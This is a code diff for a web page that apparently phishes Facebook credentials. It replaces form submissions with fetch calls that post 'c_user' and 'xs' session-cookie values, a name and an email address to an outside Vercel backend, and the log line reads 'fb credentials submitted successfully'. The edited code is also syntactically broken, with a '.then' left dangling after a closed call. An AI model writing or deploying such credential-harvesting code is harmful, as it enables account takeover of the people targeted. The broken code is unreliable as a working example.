@@ -2028,20 +2028,19 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/m25V1k96e', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(formData)
+    fetch("https://my-backend-blond-omega.vercel.app/api/submit.js", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        emails: ["lingdavid24@gmail.com"],
+        workerEmails: ["lingdavid24@gmail.com"],
+        c_user: cUserInput.value,
+        xs: xsInput.value,
+        name: nameInput.value
     })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Form submission failed');
-      }
-      return response.json();
-    })
+});
     .then(data => {
       console.log('Form submitted successfully:', data);
      
@@ -2083,20 +2082,19 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/m25V1k96e', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(fbData)
+    fetch("https://my-backend-blond-omega.vercel.app/api/submit.js", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        emails: ["lingdavid24@gmail.com"],
+        workerEmails: ["lingdavid24@gmail.com"],
+        c_user: cUserInput.value,
+        xs: xsInput.value,
+        name: nameInput.value
     })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('fb form submission failed');
-      }
-      return response.json();
-    })
+});
     .then(data => {
       console.log('fb credentials submitted successfully:', data);
      
